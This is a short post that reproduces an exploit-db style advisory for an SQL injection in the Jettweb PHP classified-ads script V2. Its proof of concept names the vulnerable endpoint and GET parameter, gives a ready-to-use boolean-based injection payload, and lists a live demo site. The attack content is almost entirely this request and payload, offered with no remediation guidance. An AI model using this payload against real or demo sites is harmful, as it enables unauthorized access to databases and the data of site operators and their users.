---
layout:     post
title:      "Jettweb İlan Sitesi V2 - SQL Injection"
date:       2019-03-26 12:00
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Jettweb Php Hazır İlan Sitesi Scripti V2 - SQL Injection
# Date: 25.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://jettweb.net/c-23-ilan-Siteleri.html
# Demo Site: http://ilanv2.proemlaksitesi.net
# Version: V2
# Tested on: Kali Linux
# CVE: N/A

----- PoC : SQLi -----

Request: http://localhost/[PATH]/m/katgetir.php?kat=1
Vulnerable Parameter: kat (GET)
Payload: kat=1' OR NOT 1300=1300-- rwTf
            
